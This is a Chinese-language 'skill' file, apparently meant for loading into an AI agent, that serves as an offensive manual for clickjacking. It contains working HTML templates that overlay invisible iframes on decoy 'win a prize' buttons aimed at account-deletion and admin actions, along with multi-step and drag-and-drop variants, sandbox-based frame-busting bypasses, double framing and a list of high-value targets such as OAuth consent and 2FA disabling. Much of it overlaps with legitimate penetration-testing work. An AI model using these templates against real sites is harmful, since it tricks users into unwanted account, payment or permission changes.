# 技能：点击劫持 — 专家攻击手册

> **AI 加载指令**：点击劫持（UI 重置）技术。涵盖 iframe 透明度技巧、X-Frame-Options 绕过、CSP frame-ancestors、多步骤点击劫持、拖放攻击，以及与其他漏洞链式利用。通常是一个“低严重性”发现，但在针对管理员操作时可能变得至关重要。

## 1. 核心概念

点击劫持将目标页面加载在一个透明 iframe 中，该 iframe 覆盖在攻击者的页面上。受害者看到的是攻击者的 UI，但点击的是不可见的 iframe，执行了非预期的操作。

```html
<style>
  iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.0001; z-index: 2; }
  .decoy { position: absolute; top: 200px; left: 100px; z-index: 1; }
</style>
<div class="decoy"><button>点击赢取奖品！</button></div>
<iframe src="https://target.com/account/delete?confirm=yes"></iframe>
```

---

## 2. 检测 — 页面是否可被框架化？

### 检查 X-Frame-Options 头部

```
X-Frame-Options: DENY           → 不能被框架化（安全）
X-Frame-Options: SAMEORIGIN     → 仅同源框架化（跨源安全）
X-Frame-Options: ALLOW-FROM uri → 已弃用，浏览器支持不一致
(header absent)                  → 可被框架化！（易受攻击）
```

### 检查 CSP frame-ancestors

```
Content-Security-Policy: frame-ancestors 'none'        → 不能被框架化
Content-Security-Policy: frame-ancestors 'self'         → 仅同源
Content-Security-Policy: frame-ancestors https://a.com  → 特定源
(directive absent)                                       → 可被框架化
```

**CSP frame-ancestors 在现代浏览器中优先于 X-Frame-Options**。

### 快速 PoC 测试

```html
<iframe src="https://target.com/sensitive-action" width="800" height="600"></iframe>
```

如果页面在 iframe 中加载 → 可被框架化 → 可能易受攻击。

### JavaScript 框架检测（从目标页面源码）

```javascript
// 常见于目标页面中的防框架化代码：
if (top.location.hostname !== self.location.hostname) {
    top.location.href = self.location.href;
}
```

如果存在此代码但未使用 CSP `frame-ancestors`，通常可以绕过。

---

## 3. 证明概念模板

### 基本单次点击

```html
<html>
<head><title>免费奖品</title></head>
<body>
<h1>点击按钮领取您的奖品！</h1>
<style>
  iframe { position: absolute; top: 300px; left: 60px;
           width: 500px; height: 200px; opacity: 0.0001; z-index: 2; }
</style>
<iframe src="https://target.com/account/settings?action=delete"></iframe>
</body>
</html>
```

### 多步骤点击劫持

针对需要多次点击的操作（例如“确定吗？”确认）：

```html
<div id="step1">
  <button onclick="document.getElementById('step1').style.display='none';
                    document.getElementById('step2').style.display='block';">
    第一步：点击这里
  </button>
</div>
<div id="step2" style="display:none">
  <button>第二步：确认</button>
</div>
<iframe src="https://target.com/admin/action"></iframe>
```

每一步重新定位 iframe，使透明按钮与诱饵对齐。

### 拖放点击劫持

使用 HTML5 拖放事件从一个 iframe 提取数据到另一个 iframe — 受害者拖动穿过不可见的 iframe，转移令牌或数据。

---

## 4. 绕过技巧

### 框架破坏脚本绕过

一些页面使用 JavaScript 框架破坏：
```javascript
if (top !== self) { top.location = self.location; }
```

**使用 sandbox 属性绕过**：
```html
<iframe src="https://target.com" sandbox="allow-forms allow-scripts"></iframe>
<!-- sandbox 不带 allow-top-navigation 防止框架破坏 -->
```

### X-Frame-Options ALLOW-FROM 绕过

`ALLOW-FROM` 在 Chrome/Safari 中不受支持。如果服务器仅依赖 `ALLOW-FROM`，现代浏览器会忽略它 → 页面可被框架化。

### 双重框架化

如果 `X-Frame-Options: SAMEORIGIN` 设置，但存在可被框架化的同源页面（无需 XFO），则使用该页面作为中介框架目标。

---

## 5. 高影响目标

```text
账户删除页面
邮箱/密码修改表单
管理员面板操作（添加用户、更改角色）
支付确认
OAuth 授权（“允许”按钮）
双因素认证禁用
API 密钥生成
Webhook 配置
```

---

## 6. 测试清单

```
□ 检查敏感页面的 X-Frame-Options 头部
□ 检查 CSP frame-ancestors 指令
□ 创建 iframe PoC 并验证页面加载
□ 测试框架破坏脚本 — 尝试 sandbox 属性绕过
□ 识别高价值单次点击操作
□ 针对多步骤操作，构建多点击 PoC
□ 测试认证和非认证页面
□ 验证 ALLOW-FROM 在不同浏览器中的行为
```
